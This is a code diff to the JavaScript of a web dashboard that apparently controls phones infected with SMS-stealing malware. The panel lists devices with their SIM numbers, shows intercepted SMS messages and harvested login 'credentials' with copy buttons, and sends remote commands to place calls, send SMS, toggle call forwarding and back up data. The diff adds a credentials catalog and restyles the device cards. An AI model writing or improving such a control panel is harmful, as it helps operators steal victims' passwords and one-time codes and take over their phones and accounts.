@@ -1,5 +1,5 @@
 /* ============================================================ */
-/* app.js - COMPLETE WITH ALL MOBILE ENHANCEMENTS              */
+/* app.js - COMPLETE WITH DEVICE CARD CSS INTEGRATION          */
 /* ============================================================ */
 
 // ============================================================
@@ -24,6 +24,7 @@ const db = firebase.database();
 const DEVICE_LIMIT = 5;
 const SMS_LIMIT = 10;
 const DELETE_PASSWORD = '9999';
+const CREDS_PER_PAGE = 10;
 
 // ============================================================
 // STATE
@@ -39,7 +40,7 @@ const state = {
     modalSmsList: [],
     expandedDevices: new Map(),
     activeTabs: new Map(),
-    isPanelOpen: { devices: true, sms: false, backup: false, analytics: false },
+    isPanelOpen: { devices: true, sms: false, credentials: false, backup: false, analytics: false },
     formMemory: {},
     deviceOffset: 0,
     allSmsOffset: 0,
@@ -53,7 +54,12 @@ const state = {
     pendingRender: null,
     pendingUpdates: new Set(),
     isFirstLoad: true,
-    dataVersion: 0
+    dataVersion: 0,
+    // Credentials catalog state
+    credCatalogData: [],
+    credFilter: 'all',
+    credSearchQuery: '',
+    credCurrentPage: 1
 };
 
 // ============================================================
@@ -142,8 +148,8 @@ function updateCaches() {
         }
     });
     
-    // Update mobile badge
     updateMobileBadge();
+    updateCredCounts();
 }
 
 // ============================================================
@@ -160,6 +166,36 @@ function updateMobileBadge() {
         badge.textContent = totalSms;
         badge.style.display = totalSms > 0 ? 'block' : 'none';
     }
+}
+
+// ============================================================
+// UPDATE CRED COUNTS
+// ============================================================
+function updateCredCounts() {
+    const loginData = state.data.login || {};
+    let totalCreds = 0;
+    let devicesWithCreds = 0;
+    
+    Object.keys(loginData).forEach(devId => {
+        const creds = loginData[devId];
+        if (creds && Object.keys(creds).length > 0) {
+            devicesWithCreds++;
+            totalCreds += Object.keys(creds).length;
+        }
+    });
+    
+    const credCount = $('credCount');
+    const mobileCredBadge = $('mobileCredBadge');
+    const panelCredCount = $('panelCredCount');
+    const panelCredDevices = $('panelCredDevices');
+    
+    if (credCount) credCount.textContent = devicesWithCreds;
+    if (mobileCredBadge) {
+        mobileCredBadge.textContent = totalCreds;
+        mobileCredBadge.style.display = totalCreds > 0 ? 'block' : 'none';
+    }
+    if (panelCredCount) panelCredCount.textContent = totalCreds;
+    if (panelCredDevices) panelCredDevices.textContent = devicesWithCreds;
 }
 
 // ============================================================
@@ -196,6 +232,7 @@ function performRender() {
         updateCounts();
         if (state.isPanelOpen.devices) renderDevicesOptimized();
         if (state.isPanelOpen.sms) renderAllSmsOptimized();
+        if (state.isPanelOpen.credentials) renderCredentialsCatalog();
         if (state.isPanelOpen.analytics) renderAnalytics();
         if (state.isPanelOpen.backup) renderBackupPanel();
     } catch (err) {
@@ -235,6 +272,7 @@ function updateCounts() {
     }
     
     updateMobileBadge();
+    updateCredCounts();
 }
 
 // ============================================================
@@ -274,7 +312,7 @@ function getFilteredDeviceKeys() {
 }
 
 // ============================================================
-// RENDER DEVICES - FIXED
+// RENDER DEVICES - WITH PREMIUM CSS CLASSES
 // ============================================================
 function renderDevicesOptimized() {
     const container = $('devicesContainer');
@@ -313,7 +351,7 @@ function renderDevicesOptimized() {
     }
     
     displayKeys.forEach((devId, index) => {
-        finalHtml += buildDeviceCard(devId, start + index, devices);
+        finalHtml += buildDeviceCardPremium(devId, start + index, devices);
     });
     
     if (hasMore) {
@@ -329,16 +367,17 @@ function renderDevicesOptimized() {
 }
 
 // ============================================================
-// BUILD DEVICE CARD
+// BUILD DEVICE CARD - PREMIUM LAYOUT WITH device-card.css
 // ============================================================
-function buildDeviceCard(devId, index, devices) {
+function buildDeviceCardPremium(devId, index, devices) {
     const dev = devices[devId] || {};
     const serial = state.deviceSerialMap.get(devId) || 0;
     const online = state.deviceOnlineStatus.get(devId) || false;
     const lastSeen = dev.last_online || dev.timestamp;
     const statusClass = online ? 'online' : 'offline';
-    const statusText = online ? '● Online' : '● Offline';
+    const statusText = online ? 'Online' : 'Offline';
     const timeStr = lastSeen ? new Date(lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'N/A';
+    const dateStr = lastSeen ? new Date(lastSeen).toLocaleDateString() : '';
     
     const smsCache = state.deviceSmsCache.get(devId);
     const totalSms = smsCache ? smsCache.all.length : 0;
@@ -362,208 +401,272 @@ function buildDeviceCard(devId, index, devices) {
         devSmsList = smsCache.all.slice(startIdx, endIdx).reverse();
     }
     
-    let allLoginHtml = '';
+    // Build Credentials HTML - Premium
+    let credsHtml = '';
     if (devLoginList.length > 0) {
-        allLoginHtml = devLoginList.map((rec, idx) => {
+        credsHtml = devLoginList.map((rec, idx) => {
             let fields = '';
             for (let k in rec) {
                 if (k === 'key' || k === 'timestamp') continue;
                 const value = rec[k] || 'N/A';
                 const escaped = escapeHtml(String(value));
-                fields += `<div class="login-field">
-                    <span class="field-label">${escapeHtml(k)}:</span>
-                    <span class="field-value" id="field-${devId}-${idx}-${k}">${escaped}</span>
-                    <button class="copy-field-btn" onclick="event.stopPropagation();copyField('field-${devId}-${idx}-${k}')" title="Copy ${k}">
-                        <i class="fas fa-copy"></i>
-                    </button>
-                </div>`;
+                fields += `
+                    <div class="cred-field-premium">
+                        <span class="field-label-premium">${escapeHtml(k)}</span>
+                        <span style="display:flex;align-items:center;gap:6px;">
+                            <span class="field-value-premium" id="field-${devId}-${idx}-${k}">${escaped}</span>
+                            <button class="copy-btn-premium" onclick="event.stopPropagation();copyField('field-${devId}-${idx}-${k}')">
+                                <i class="fas fa-copy"></i>
+                            </button>
+                        </span>
+                    </div>
+                `;
             }
-            return `<div class="login-card">
-                <div class="login-card-header">
-                    <span>Record ${idx+1}</span>
-                    <span class="record-number">#${idx+1}</span>
+            return `
+                <div class="cred-item-premium">
+                    <div class="cred-header-premium">
+                        <span>📋 Record ${idx+1}</span>
+                        <span style="font-size:9px;color:var(--text-muted);">#${idx+1}</span>
+                    </div>
+                    <div class="cred-fields-premium">${fields}</div>
                 </div>
-                <div class="login-card-body">${fields}</div>
-            </div>`;
+            `;
         }).join('');
     }
     
-    let scrollIndicator = '';
-    if (devLoginList.length > 5) {
-        scrollIndicator = `
-            <div style="display:flex;gap:6px;margin-top:6px;flex-wrap:wrap;">
-                <button class="scroll-to-bottom-btn" onclick="event.stopPropagation();scrollCredentialsToTop('${devId}')">
-                    <i class="fas fa-arrow-up"></i> Top
-                </button>
-                <button class="scroll-to-bottom-btn" onclick="event.stopPropagation();scrollCredentialsToBottom('${devId}')">
-                    <i class="fas fa-arrow-down"></i> Bottom
-                </button>
-                <span style="font-size:9px;color:var(--text-muted);display:flex;align-items:center;padding:0 8px;">
-                    ${devLoginList.length} records
-                </span>
-            </div>
+    // Build SMS HTML - Premium
+    let smsHtml = '';
+    if (devSmsList.length > 0) {
+        smsHtml = devSmsList.map(msg => {
+            const sender = msg.sender || msg.address || 'Unknown';
+            const body = msg.body || 'No content';
+            const date = msg.date_formatted || msg.date || '';
+            return `
+                <div class="sms-item-premium">
+                    <div class="sms-header-premium">
+                        <span class="sms-sender-premium">👤 ${escapeHtml(sender)}</span>
+                        <span>${escapeHtml(date)}</span>
+                    </div>
+                    <div class="sms-body-premium">${escapeHtml(body)}</div>
+                </div>
+            `;
+        }).join('');
+    } else {
+        smsHtml = '<div class="empty-luxury" style="padding:10px 0;">No SMS</div>';
+    }
+    
+    // Build Action Buttons
+    const actions = [
+        { id: 'sms', icon: '💬', label: 'SMS', count: totalSms, activeClass: 'active-sms' },
+        { id: 'login', icon: '🔑', label: 'Login', count: devLoginList.length, activeClass: 'active-login' },
+        { id: 'call', icon: '📞', label: 'Call', activeClass: 'active-call' },
+        { id: 'sendsms', icon: '✉️', label: 'Send', activeClass: 'active-sendsms' },
+        { id: 'fwd', icon: '🔀', label: 'Forward', activeClass: 'active-fwd' },
+        { id: 'backup', icon: '💾', label: 'Backup', activeClass: 'active-backup' },
+        { id: 'delete', icon: '🗑️', label: 'Delete', activeClass: 'active-delete' }
+    ];
+    
+    let actionsHtml = actions.map(a => {
+        const isActive = activeTab === a.id;
+        const countHtml = a.count !== undefined && a.count > 0 ? `<span class="btn-badge">${a.count}</span>` : '';
+        const activeClass = isActive ? a.activeClass : '';
+        return `
+            <button class="action-btn-premium ${activeClass}" onclick="event.stopPropagation();setTab('${devId}','${a.id}')">
+                ${a.icon} ${a.label} ${countHtml}
+            </button>
         `;
-    }
+    }).join('');
     
-    let smsHtml = renderSmsCards(devSmsList);
-    if (devSmsList.length === 0) {
-        smsHtml = '<div class="empty-luxury">No SMS</div>';
-    }
+    // Build Section Content
+    const sections = {
+        sms: `
+            <div class="section-premium ${activeTab === 'sms' ? 'active' : ''}" id="sec-sms-${devId}">
+                <div class="section-title">
+                    💬 SMS
+                    <span style="margin-left:auto;font-size:10px;color:var(--text-muted);">${totalSms} messages</span>
+                    <button onclick="event.stopPropagation();openSmsModal('${devId}')" style="background:var(--gold);color:#0c0e14;border:none;padding:2px 12px;border-radius:6px;font-size:10px;font-weight:600;cursor:pointer;">⛶ Full</button>
+                </div>
+                <div class="sms-list-premium">${smsHtml}</div>
+                ${hasMoreSms ? `<button class="btn-load-more" style="margin-top:6px;padding:6px;font-size:11px;" onclick="event.stopPropagation();loadMoreDeviceSms('${devId}')">📥 Load More</button>` : ''}
+            </div>
+        `,
+        login: `
+            <div class="section-premium ${activeTab === 'login' ? 'active' : ''}" id="sec-login-${devId}">
+                <div class="section-title">
+                    🔑 Credentials
+                    <span style="margin-left:auto;font-size:10px;color:var(--text-muted);">${devLoginList.length} records</span>
+                    ${devLoginList.length > 0 ? `<button class="login-delete-all-btn" onclick="event.stopPropagation();deleteDeviceCredentials('${devId}')">🗑️ Delete All</button>` : ''}
+                </div>
+                <div class="creds-container-premium" id="login-cards-${devId}">
+                    ${devLoginList.length === 0 ? '<div class="empty-luxury"><i class="fas fa-key"></i> No credentials found</div>' : credsHtml}
+                </div>
+                ${devLoginList.length > 5 ? `
+                    <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap;">
+                        <button class="scroll-to-bottom-btn" onclick="event.stopPropagation();scrollCredentialsToTop('${devId}')">
+                            <i class="fas fa-arrow-up"></i> Top
+                        </button>
+                        <button class="scroll-to-bottom-btn" onclick="event.stopPropagation();scrollCredentialsToBottom('${devId}')">
+                            <i class="fas fa-arrow-down"></i> Bottom
+                        </button>
+                    </div>
+                ` : ''}
+            </div>
+        `,
+        call: `
+            <div class="section-premium ${activeTab === 'call' ? 'active' : ''}" id="sec-call-${devId}">
+                <div class="section-title">📞 Make Call</div>
+                <input type="text" id="callNum-${devId}" value="${escapeHtml(state.formMemory['callNum-' + devId] || '')}" placeholder="Phone Number" oninput="state.formMemory['callNum-${devId}']=this.value" onclick="event.stopPropagation()" style="width:100%;padding:8px 12px;margin:4px 0 8px;background:var(--bg-card);color:var(--text-primary);border:1px solid var(--border-color);border-radius:var(--radius-sm);font-size:12px;outline:none;">
+                <select id="callSim-${devId}" onchange="state.formMemory['callSim-${devId}']=this.value" onclick="event.stopPropagation()" style="width:100%;padding:8px 12px;margin:4px 0 8px;background:var(--bg-card);color:var(--text-primary);border:1px solid var(--border-color);border-radius:var(--radius-sm);font-size:12px;outline:none;">
+                    <option value="0" ${(state.formMemory['callSim-' + devId] || '0') === '0' ? 'selected' : ''}>SIM 1</option>
+                    <option value="1" ${(state.formMemory['callSim-' + devId] || '0') === '1' ? 'selected' : ''}>SIM 2</option>
+                </select>
+                <button class="btn-luxury btn-purple" onclick="event.stopPropagation();showCommandDialog('call','${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
+                    <i class="fas fa-phone"></i> Call
+                </button>
+            </div>
+        `,
+        sendsms: `
+            <div class="section-premium ${activeTab === 'sendsms' ? 'active' : ''}" id="sec-sendsms-${devId}">
+                <div class="section-title">✉️ Send SMS</div>
+                <input type="text" id="smsNum-${devId}" value="${escapeHtml(state.formMemory['smsNum-' + devId] || '')}" placeholder="Recipient" oninput="state.formMemory['smsNum-${devId}']=this.value" onclick="event.stopPropagation()" style="width:100%;padding:8px 12px;margin:4px 0 8px;background:var(--bg-card);color:var(--text-primary);border:1px solid var(--border-color);border-radius:var(--radius-sm);font-size:12px;outline:none;">
+                <textarea id="smsText-${devId}" placeholder="Message" rows="2" oninput="state.formMemory['smsText-${devId}']=this.value" onclick="event.stopPropagation()" style="width:100%;padding:8px 12px;margin:4px 0 8px;background:var(--bg-card);color:var(--text-primary);border:1px solid var(--border-color);border-radius:var(--radius-sm);font-size:12px;outline:none;resize:vertical;min-height:50px;font-family:'Inter',sans-serif;">${escapeHtml(state.formMemory['smsText-' + devId] || '')}</textarea>
+                <select id="smsSim-${devId}" onchange="state.formMemory['smsSim-${devId}']=this.value" onclick="event.stopPropagation()" style="width:100%;padding:8px 12px;margin:4px 0 8px;background:var(--bg-card);color:var(--text-primary);border:1px solid var(--border-color);border-radius:var(--radius-sm);font-size:12px;outline:none;">
+                    <option value="1" ${(state.formMemory['smsSim-' + devId] || '1') === '1' ? 'selected' : ''}>SIM 1</option>
+                    <option value="2" ${(state.formMemory['smsSim-' + devId] || '1') === '2' ? 'selected' : ''}>SIM 2</option>
+                </select>
+                <button class="btn-luxury btn-blue" onclick="event.stopPropagation();showCommandDialog('sms','${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
+                    <i class="fas fa-paper-plane"></i> Send
+                </button>
+            </div>
+        `,
+        fwd: `
+            <div class="section-premium ${activeTab === 'fwd' ? 'active' : ''}" id="sec-fwd-${devId}">
+                <div class="section-title">🔀 Call Forward</div>
+                <input type="text" id="fwdNum-${devId}" value="${escapeHtml(state.formMemory['fwdNum-' + devId] || '')}" placeholder="Forward To" oninput="state.formMemory['fwdNum-${devId}']=this.value" onclick="event.stopPropagation()" style="width:100%;padding:8px 12px;margin:4px 0 8px;background:var(--bg-card);color:var(--text-primary);border:1px solid var(--border-color);border-radius:var(--radius-sm);font-size:12px;outline:none;">
+                <select id="fwdSim-${devId}" onchange="state.formMemory['fwdSim-${devId}']=this.value" onclick="event.stopPropagation()" style="width:100%;padding:8px 12px;margin:4px 0 8px;background:var(--bg-card);color:var(--text-primary);border:1px solid var(--border-color);border-radius:var(--radius-sm);font-size:12px;outline:none;">
+                    <option value="0" ${(state.formMemory['fwdSim-' + devId] || '0') === '0' ? 'selected' : ''}>SIM 1</option>
+                    <option value="1" ${(state.formMemory['fwdSim-' + devId] || '0') === '1' ? 'selected' : ''}>SIM 2</option>
+                </select>
+                <button class="btn-luxury" style="background:var(--green);color:#fff;padding:8px;font-size:11px;width:100%;justify-content:center;margin-bottom:4px;" onclick="event.stopPropagation();showCommandDialog('fwd_on','${devId}')">
+                    <i class="fas fa-play"></i> Activate
+                </button>
+                <button class="btn-luxury btn-red" onclick="event.stopPropagation();showCommandDialog('fwd_off','${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
+                    <i class="fas fa-stop"></i> Deactivate
+                </button>
+            </div>
+        `,
+        backup: `
+            <div class="section-premium ${activeTab === 'backup' ? 'active' : ''}" id="sec-backup-${devId}">
+                <div class="section-title">💾 Backup</div>
+                <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;">
+                    <button class="btn-luxury btn-purple" onclick="event.stopPropagation();showCommandDialog('backup','${devId}')" style="padding:8px;font-size:11px;justify-content:center;">
+                        <i class="fas fa-database"></i> Backup
+                    </button>
+                    <button class="btn-luxury btn-blue" onclick="event.stopPropagation();refreshDeviceBackup('${devId}')" style="padding:8px;font-size:11px;justify-content:center;">
+                        <i class="fas fa-sync"></i> Refresh
+                    </button>
+                </div>
+                <div id="deviceBackup-${devId}" style="margin-top:8px;padding:8px;background:var(--bg-primary);border-radius:6px;border:1px solid var(--border-color);font-size:11px;color:var(--text-muted);">
+                    Click Refresh to check status
+                </div>
+            </div>
+        `,
+        delete: `
+            <div class="section-premium ${activeTab === 'delete' ? 'active' : ''}" id="sec-delete-${devId}" style="border-color:var(--red);">
+                <div class="section-title" style="color:var(--red);">🗑️ Delete Device Data</div>
+                <div style="display:flex;flex-direction:column;gap:8px;">
+                    <button class="btn-luxury btn-red" onclick="event.stopPropagation();deleteDeviceSms('${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
+                        <i class="fas fa-trash"></i> Delete All SMS
+                    </button>
+                    <button class="btn-luxury btn-purple-delete" onclick="event.stopPropagation();deleteDeviceCredentials('${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
+                        <i class="fas fa-trash"></i> Delete All Credentials
+                    </button>
+                </div>
+                <div class="delete-password-hint" style="margin-top:8px;font-size:10px;color:var(--text-muted);padding:8px;background:rgba(239,68,68,0.05);border-radius:6px;border:1px solid rgba(239,68,68,0.1);display:flex;align-items:center;gap:8px;">
+                    <span style="font-size:14px;">⚠️</span>
+                    Password required: <span style="color:var(--gold);font-weight:600;">9999</span>
+                </div>
+            </div>
+        `
+    };
     
+    // Combine all sections
+    let sectionsHtml = '';
+    ['sms', 'login', 'call', 'sendsms', 'fwd', 'backup', 'delete'].forEach(key => {
+        sectionsHtml += sections[key] || '';
+    });
+    
+    // Build the complete premium card
     return `
-        <div class="device-card-luxury ${isExpanded ? 'expanded' : ''}" id="card-${devId}" data-device-id="${devId}">
+        <div class="device-card-premium ${statusClass} ${isExpanded ? 'expanded' : ''}" id="card-${devId}" data-device-id="${devId}">
+            <!-- Swipe Delete Hint -->
             <div class="swipe-delete-hint">
                 <i class="fas fa-trash"></i> Delete
             </div>
-            <div class="device-top" onclick="toggleDevice('${devId}')">
-                <div>
-                    <div class="device-name">
-                        <span class="device-serial-badge">#${index + 1}</span>
-                        📱 ${escapeHtml(devId)}
-                        ${serial > 0 ? `<span class="device-serial-badge" style="background:rgba(16,185,129,0.12);color:var(--green);border-color:rgba(16,185,129,0.2);">S-${serial}</span>` : ''}
+            
+            <!-- Card Header -->
+            <div class="card-header" onclick="toggleDevice('${devId}')">
+                <div class="device-info-left">
+                    <div class="device-name-premium">
+                        <span class="name-text">📱 ${escapeHtml(devId)}</span>
+                        <span class="device-id">#${index + 1}</span>
+                        ${serial > 0 ? `<span class="serial-badge-premium"><i class="fas fa-hashtag"></i> S-${serial}</span>` : ''}
                     </div>
-                    <div style="font-size:10px;color:var(--text-muted);margin-top:2px;">
-                        ${isExpanded ? '▲ Click to collapse' : '▼ Click to expand'}
+                    <div class="device-sub-info">
+                        <span><i class="fas fa-microchip"></i> ${escapeHtml(dev.Device_info || dev.device_info || 'N/A')}</span>
+                        <span><i class="fas fa-sim-card"></i> ${escapeHtml(dev.numberSim1 || dev.sim1 || 'No SIM')}</span>
+                        ${dev.numberSim2 || dev.sim2 ? `<span><i class="fas fa-sim-card"></i> ${escapeHtml(dev.numberSim2 || dev.sim2)}</span>` : ''}
                     </div>
                 </div>
-                <div style="text-align:right;">
-                    <span class="device-status ${statusClass}" id="status-${devId}">${statusText}</span>
-                    <div style="font-size:9px;color:var(--text-muted);margin-top:2px;" id="time-${devId}">⏱ ${timeStr}</div>
-                    <button class="check-status-btn" onclick="event.stopPropagation();checkDeviceStatus('${devId}')" title="Check Online Status">
+                <div style="display:flex;flex-direction:column;align-items:flex-end;gap:4px;">
+                    <span class="status-badge-premium ${statusClass}">
+                        <span class="status-dot"></span>
+                        ${statusText}
+                    </span>
+                    <div class="last-seen-premium">
+                        <i class="far fa-clock"></i> ${dateStr ? dateStr + ' ' : ''}${timeStr}
+                    </div>
+                    <button class="check-status-btn-premium" onclick="event.stopPropagation();checkDeviceStatus('${devId}')" title="Check Status">
                         <i class="fas fa-sync-alt"></i>
                     </button>
                 </div>
             </div>
-
-            <div class="device-info-grid" onclick="toggleDevice('${devId}')">
-                <div class="item"><span>Device</span><b>${escapeHtml(dev.Device_info || dev.device_info || 'N/A')}</b></div>
-                <div class="item"><span>SIM 1</span><b>${escapeHtml(dev.numberSim1 || dev.sim1 || 'N/A')}</b></div>
-                <div class="item"><span>SIM 2</span><b>${escapeHtml(dev.numberSim2 || dev.sim2 || 'N/A')}</b></div>
-                ${serial > 0 ? `<div class="item"><span>Serial</span><b style="color:var(--gold);">${serial}</b></div>` : ''}
+            
+            <!-- Info Grid -->
+            <div class="info-grid-premium" onclick="toggleDevice('${devId}')">
+                <div class="info-item-premium">
+                    <span class="info-label">Device</span>
+                    <span class="info-value">${escapeHtml(dev.Device_info || dev.device_info || 'N/A')}</span>
+                </div>
+                <div class="info-item-premium">
+                    <span class="info-label">SIM 1</span>
+                    <span class="info-value ${dev.numberSim1 || dev.sim1 ? '' : 'sim-empty'}">${escapeHtml(dev.numberSim1 || dev.sim1 || 'No SIM')}</span>
+                </div>
+                <div class="info-item-premium">
+                    <span class="info-label">SIM 2</span>
+                    <span class="info-value ${dev.numberSim2 || dev.sim2 ? '' : 'sim-empty'}">${escapeHtml(dev.numberSim2 || dev.sim2 || 'No SIM')}</span>
+                </div>
+                <div class="info-item-premium">
+                    <span class="info-label">Serial</span>
+                    <span class="info-value highlight">${serial > 0 ? serial : '—'}</span>
+                </div>
             </div>
-
-            <div class="device-body">
-                <div class="device-actions-luxury">
-                    <button class="sub-btn ${activeTab === 'sms' ? 'active-sms' : ''}" onclick="event.stopPropagation();setTab('${devId}','sms')">
-                        💬 ${totalSms}
-                    </button>
-                    <button class="sub-btn ${activeTab === 'login' ? 'active-login' : ''}" onclick="event.stopPropagation();setTab('${devId}','login')">
-                        🔑 ${devLoginList.length}
-                    </button>
-                    <button class="sub-btn ${activeTab === 'call' ? 'active-call' : ''}" onclick="event.stopPropagation();setTab('${devId}','call')">📞</button>
-                    <button class="sub-btn ${activeTab === 'sendsms' ? 'active-sendsms' : ''}" onclick="event.stopPropagation();setTab('${devId}','sendsms')">✉️</button>
-                    <button class="sub-btn ${activeTab === 'fwd' ? 'active-fwd' : ''}" onclick="event.stopPropagation();setTab('${devId}','fwd')">🔀</button>
-                    <button class="sub-btn ${activeTab === 'backup' ? 'active-backup' : ''}" onclick="event.stopPropagation();setTab('${devId}','backup')">💾</button>
-                    <button class="sub-btn ${activeTab === 'delete' ? 'active-delete' : ''}" onclick="event.stopPropagation();setTab('${devId}','delete')" style="color:var(--red);">🗑️</button>
+            
+            <!-- Expand Hint -->
+            <div class="expand-hint" onclick="toggleDevice('${devId}')">
+                <i class="fas fa-chevron-down"></i>
+                ${isExpanded ? 'Click to collapse' : 'Click to expand'}
+            </div>
+            
+            <!-- Expandable Content -->
+            <div class="expandable-content">
+                <!-- Actions Row -->
+                <div class="actions-row-premium">
+                    ${actionsHtml}
                 </div>
-
-                <!-- SMS Section -->
-                <div class="section-box ${activeTab === 'sms' ? 'active' : ''}" id="sec-sms-${devId}">
-                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
-                        <h4 style="color:var(--gold-light);margin:0;font-size:13px;">💬 SMS (${totalSms})</h4>
-                        <div style="display:flex;gap:4px;">
-                            <button onclick="event.stopPropagation();openSmsModal('${devId}')" style="background:var(--gold);color:#0c0e14;border:none;padding:2px 12px;border-radius:6px;font-size:10px;font-weight:600;cursor:pointer;">⛶ Full</button>
-                            ${totalSms > 0 ? `<button onclick="event.stopPropagation();deleteDeviceSms('${devId}')" style="background:var(--red);color:#fff;border:none;padding:2px 12px;border-radius:6px;font-size:10px;font-weight:600;cursor:pointer;">🗑️ Delete</button>` : ''}
-                        </div>
-                    </div>
-                    <div class="sms-list-luxury">
-                        ${smsHtml}
-                    </div>
-                    ${hasMoreSms ? `<button class="btn-load-more" style="margin-top:6px;padding:6px;font-size:11px;" onclick="event.stopPropagation();loadMoreDeviceSms('${devId}')">📥 Load More</button>` : ''}
-                </div>
-
-                <!-- Login Section -->
-                <div class="section-box ${activeTab === 'login' ? 'active' : ''}" id="sec-login-${devId}">
-                    <div class="credentials-header">
-                        <h4>🔑 All Credentials</h4>
-                        <div class="header-actions">
-                            <span class="credentials-count">
-                                <i class="fas fa-key"></i> ${devLoginList.length}
-                            </span>
-                            ${devLoginList.length > 0 ? `<button class="login-delete-all-btn" onclick="event.stopPropagation();deleteDeviceCredentials('${devId}')">🗑️ Delete All</button>` : ''}
-                        </div>
-                    </div>
-                    <div class="login-cards" id="login-cards-${devId}">
-                        ${devLoginList.length === 0 ? '<div class="empty-luxury"><i class="fas fa-key"></i>No credentials found</div>' : allLoginHtml}
-                    </div>
-                    ${scrollIndicator}
-                </div>
-
-                <!-- Call Section -->
-                <div class="section-box ${activeTab === 'call' ? 'active' : ''}" id="sec-call-${devId}">
-                    <h4 style="color:var(--green);font-size:13px;">📞 Make Call</h4>
-                    <input type="text" id="callNum-${devId}" value="${escapeHtml(state.formMemory['callNum-' + devId] || '')}" placeholder="Phone Number" oninput="state.formMemory['callNum-${devId}']=this.value" onclick="event.stopPropagation()">
-                    <select id="callSim-${devId}" onchange="state.formMemory['callSim-${devId}']=this.value" onclick="event.stopPropagation()">
-                        <option value="0" ${(state.formMemory['callSim-' + devId] || '0') === '0' ? 'selected' : ''}>SIM 1</option>
-                        <option value="1" ${(state.formMemory['callSim-' + devId] || '0') === '1' ? 'selected' : ''}>SIM 2</option>
-                    </select>
-                    <button class="btn-luxury btn-purple" onclick="event.stopPropagation();showCommandDialog('call','${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
-                        <i class="fas fa-phone"></i> Call
-                    </button>
-                </div>
-
-                <!-- Send SMS Section -->
-                <div class="section-box ${activeTab === 'sendsms' ? 'active' : ''}" id="sec-sendsms-${devId}">
-                    <h4 style="color:var(--purple);font-size:13px;">✉️ Send SMS</h4>
-                    <input type="text" id="smsNum-${devId}" value="${escapeHtml(state.formMemory['smsNum-' + devId] || '')}" placeholder="Recipient" oninput="state.formMemory['smsNum-${devId}']=this.value" onclick="event.stopPropagation()">
-                    <textarea id="smsText-${devId}" placeholder="Message" rows="2" oninput="state.formMemory['smsText-${devId}']=this.value" onclick="event.stopPropagation()">${escapeHtml(state.formMemory['smsText-' + devId] || '')}</textarea>
-                    <select id="smsSim-${devId}" onchange="state.formMemory['smsSim-${devId}']=this.value" onclick="event.stopPropagation()">
-                        <option value="1" ${(state.formMemory['smsSim-' + devId] || '1') === '1' ? 'selected' : ''}>SIM 1</option>
-                        <option value="2" ${(state.formMemory['smsSim-' + devId] || '1') === '2' ? 'selected' : ''}>SIM 2</option>
-                    </select>
-                    <button class="btn-luxury btn-blue" onclick="event.stopPropagation();showCommandDialog('sms','${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
-                        <i class="fas fa-paper-plane"></i> Send
-                    </button>
-                </div>
-
-                <!-- Forward Section -->
-                <div class="section-box ${activeTab === 'fwd' ? 'active' : ''}" id="sec-fwd-${devId}">
-                    <h4 style="color:var(--red);font-size:13px;">🔀 Call Forward</h4>
-                    <input type="text" id="fwdNum-${devId}" value="${escapeHtml(state.formMemory['fwdNum-' + devId] || '')}" placeholder="Forward To" oninput="state.formMemory['fwdNum-${devId}']=this.value" onclick="event.stopPropagation()">
-                    <select id="fwdSim-${devId}" onchange="state.formMemory['fwdSim-${devId}']=this.value" onclick="event.stopPropagation()">
-                        <option value="0" ${(state.formMemory['fwdSim-' + devId] || '0') === '0' ? 'selected' : ''}>SIM 1</option>
-                        <option value="1" ${(state.formMemory['fwdSim-' + devId] || '0') === '1' ? 'selected' : ''}>SIM 2</option>
-                    </select>
-                    <button class="btn-luxury" style="background:var(--green);color:#fff;padding:8px;font-size:11px;width:100%;justify-content:center;margin-bottom:4px;" onclick="event.stopPropagation();showCommandDialog('fwd_on','${devId}')">
-                        <i class="fas fa-play"></i> Activate
-                    </button>
-                    <button class="btn-luxury btn-red" onclick="event.stopPropagation();showCommandDialog('fwd_off','${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
-                        <i class="fas fa-stop"></i> Deactivate
-                    </button>
-                </div>
-
-                <!-- Backup Section -->
-                <div class="section-box ${activeTab === 'backup' ? 'active' : ''}" id="sec-backup-${devId}">
-                    <h4 style="color:#06b6d4;font-size:13px;">💾 Backup</h4>
-                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;">
-                        <button class="btn-luxury btn-purple" onclick="event.stopPropagation();showCommandDialog('backup','${devId}')" style="padding:8px;font-size:11px;justify-content:center;">
-                            <i class="fas fa-database"></i> Backup
-                        </button>
-                        <button class="btn-luxury btn-blue" onclick="event.stopPropagation();refreshDeviceBackup('${devId}')" style="padding:8px;font-size:11px;justify-content:center;">
-                            <i class="fas fa-sync"></i> Refresh
-                        </button>
-                    </div>
-                    <div id="deviceBackup-${devId}" style="margin-top:8px;padding:8px;background:var(--bg-primary);border-radius:6px;border:1px solid var(--border-color);font-size:11px;color:var(--text-muted);">
-                        Click Refresh to check status
-                    </div>
-                </div>
-
-                <!-- Delete Section -->
-                <div class="section-box ${activeTab === 'delete' ? 'active' : ''}" id="sec-delete-${devId}" style="border-color:var(--red);">
-                    <h4 style="color:var(--red);font-size:13px;">🗑️ Delete Device Data</h4>
-                    <div class="device-delete-actions">
-                        <button class="btn-luxury btn-red" onclick="event.stopPropagation();deleteDeviceSms('${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
-                            <i class="fas fa-trash"></i> Delete All SMS
-                        </button>
-                        <button class="btn-luxury btn-purple-delete" onclick="event.stopPropagation();deleteDeviceCredentials('${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
-                            <i class="fas fa-trash"></i> Delete All Credentials
-                        </button>
-                    </div>
-                    <div class="delete-password-hint">
-                        <span class="hint-icon">⚠️</span>
-                        Password required: <span class="hint-password">9999</span>
-                    </div>
-                </div>
+                
+                <!-- Sections -->
+                ${sectionsHtml}
             </div>
         </div>
     `;
@@ -583,9 +686,9 @@ function toggleDevice(devId) {
         const card = document.getElementById(`card-${devId}`);
         if (card) {
             card.classList.toggle('expanded');
